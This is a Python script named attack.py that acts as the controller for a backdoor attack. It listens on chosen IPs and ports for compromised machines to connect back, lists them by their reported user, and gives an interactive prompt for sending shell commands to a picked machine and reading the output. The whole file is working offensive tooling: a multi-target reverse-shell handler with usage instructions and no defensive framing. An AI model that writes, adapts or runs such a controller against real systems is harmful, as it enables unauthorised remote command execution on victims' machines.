#! usr/bin/env python3

"""
* Author:               Job Jacob
* Created:              24 December 2020 
* Filename:             attack.py
* Example Run (Linux):  python3 attack.py -t 192.168.1.11 -p 2000
"""

import json
import socket
import argparse
import subprocess
from threading import Thread

"""
* Function Name:  print_sample_usage_msg()
* Input:          None
* Output:         None
* Logic:          The function just prints a message on how to run the script with the required arguments.
* Example Call:   print_sample_usage_msg()
"""
def print_sample_usage_msg():
    print("\nSAMPLE USAGE:")
    print("If the IP addresses of the target systems are 192.168.1.5 and 192.168.1.11, and if the ports for communication with each target is 1500 and 2000 respectively, then run the code as:")
    print("\tpython3 " + __file__ + " -t 192.168.1.5 192.168.1.11 -p 1500 2000")
    print("Keep in mind to use distinct ports for each target as your system can only run one process in each port.")

""" 
* Function Name:  get_dns_spoofer_args()
* Input:          None
* Output:         args.targets (set): The IP address(es) of the target(s).
*                 args.ports (set): The port(s) for communication with the target system(s).
* Logic:          The function parses the parameters passed to the script and verifies if all the required parameters are present.
* Example Call:   targets, ports = get_backdoor_attack_args()
"""
def get_backdoor_attack_args():
    parser = argparse.ArgumentParser()                                  
    parser.add_argument("-t", "--targets", nargs="+", help="the IP address(es) of the target(s) (required)")
    parser.add_argument("-p", "--ports", nargs="+", help="the port(s) for communication with the target system(s) (required)")
    args = parser.parse_args()

    if(len(set(args.targets)) != len(set(args.ports))):
        print("\nError: target and port mismatch!! Pass the correct target IPs and ports as an argument to the script.")
        print_sample_usage_msg()  
        return None, None

    if((args.targets == None) and (args.ports == None)):
        print("\nError: target and port missing!! Pass the target IPs and ports as an argument to the script.")
        print_sample_usage_msg()        

    elif(args.targets == None):
        print("\nError: Target IP address(es) missing!! Pass the target IP address(es) as an argument to the script.")
        print_sample_usage_msg()

    elif(args.ports == None):
        print("\nError: Port number(s) missing!! Pass the missing port number(s) as an argument to the script.")
        print_sample_usage_msg()

    return set(args.targets), set(args.ports)


class BackdoorAttack:
    compromised_sys_count = 0
    compromised_users = {}

    """ 
    * Function Name:  __init__()
    * Input:          self (BackdoorAttack object): Instance of the class.
    *                 ip (string): The IP address of the attacker system.
    *                 port (integer): The port through which the connection should be established.
    * Output:         None
    * Logic:          The function is used to create a TCP connection from the compromised system to the attacker system.
    * Example Call:   attack = BackdoorAttack("192.168.1.11", 2000)
    """
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        self.connection, self.address = listener.accept()
        
        BackdoorAttack.compromised_users[self.address[0]] = self.receive_data()
        BackdoorAttack.compromised_sys_count += 1

    """ 
    * Function Name:  receive_data()
    * Input:          self (BackdoorAttack object): Instance of the class.
    * Output:         data (string): The results / data received from the compromised system.
    * Logic:          The function is used to receive data from the compromised system in a serialized manner.
    * Example Call:   self.receive_data()
    """
    def receive_data(self):
        data = ""

        while True:
            try:
                data += self.connection.recv(1024).decode('utf-8')
                return json.loads(data)

            except ValueError:
                continue

    """ 
    * Function Name:  send_data()
    * Input:          self (BackdoorAttack object): Instance of the class.
    *                 data (string): The command to execute / data to be uploaded in the compromised system.
    * Output:         None
    * Logic:          The function is used to send data to the compromised system in a serialized manner.
    * Example Call:   self.send_data("ls")
    """
    def send_data(self, data):
        data = json.dumps(data)
        self.connection.send(data.encode('utf-8'))

    """ 
    * Function Name:  communicate()
    * Input:          self (BackdoorAttack object): Instance of the class.
    *                 command (string): Command to execute in the compromised system.
    * Output:         result (string): The output of the command after execution in the compromised system.
    * Logic:          The function is used to send commands to compromised systems for execution and collects the result received from the system.
    * Example Call:   self.execute_on_sys("ls)
    """
    def execute_on_sys(self, command):
        self.send_data(command)

        if(command[0] == "quit"):
            self.connection.close()
            BackdoorAttack.compromised_sys_count -= 1
            BackdoorAttack.compromised_users.pop(self.address[0])

            return "close"

        result = self.receive_data()

        return result
    
    """ 
    * Function Name:  communicate()
    * Input:          self (BackdoorAttack object): Instance of the class.
    * Output:         None
    * Logic:          The function is used to tranfer data / commands between the compromised system and the attacker. 
    * Example Call:   self.communicate()
    """
    def communicate(self):
        print("\nAttacking {}...\nEnter 'quit' to terminate connection / 'back' to return to main menu.".format(self.address[0]))

        run = 1       
        while run:
            command = input("\n>> ").split(" ")

            if(command[0] != "back"):
                result = self.execute_on_sys(command)

                if(result == "close"):
                    run = 0

                else:    
                    print("\n{}\n".format(result))

            else:
                run = 0

        print("\nReturning back to main menu...\n")

""" 
* Function Name:  create_listener()
* Input:          ip (string): The IP address of the attacker system.
*                 port (integer): The port through which the connection should be established.
* Output:         None
* Logic:          The function is used to create a listener object for each target system.
* Example Call:   create_listener("192.168.1.11", 2000)
"""
def create_listener(ip, port):
    listener.append(BackdoorAttack(ip, port))


if __name__ == "__main__":
    targets, ports = get_backdoor_attack_args()

    if((targets != None) and (ports != None)):
        try:
            listener = []
            listen_thread = []
            for ip, port in zip(targets, ports):
                listen_thread.append(Thread(target=create_listener, args=(ip, int(port), )))

            for thread in listen_thread:
                thread.daemon = True
                thread.start()

            option = None
            print_waiting = 1
            while(option != "q"):
                if(BackdoorAttack.compromised_sys_count > 0):
                    print("\nCompromised System(s):")
                    i = 1
                    for user in BackdoorAttack.compromised_users.values():
                        print("{}. {}".format(i, user))
                        i += 1
                    
                    option = input("Enter option number of target / q to quit: ")

                    if(option != "q"):
                        if(option in (str(i) for i in range(1, len(BackdoorAttack.compromised_users)+1))):
                            listener[int(option)-1].communicate()

                            if(BackdoorAttack.compromised_sys_count == 0):
                                print_waiting = 1

                        else:
                            print("\n\nSorry, INVALID Option. Please try again.\n")
                            
                else:
                    if(print_waiting):
                        print("\nWaiting for compromised systems...\n")
                        print_waiting = 0

            if(option == "q"):
                if(BackdoorAttack.compromised_sys_count > 0):
                    print("\n\nClosing all connections...")
                    for obj in listener:
                        obj.execute_on_sys(["quit"])
                    print("Stopping Backdoor Attack...\n")

                else:
                    print("\n\nStopping Backdoor Attack...\n")

        except KeyboardInterrupt: 
            if(BackdoorAttack.compromised_sys_count > 0):
                print("\n\nClosing all connections...")
                for obj in listener:
                    obj.execute_on_sys(["quit"])
                print("Stopping Backdoor Attack...\n")

            else:
                print("\n\nStopping Backdoor Attack...\n")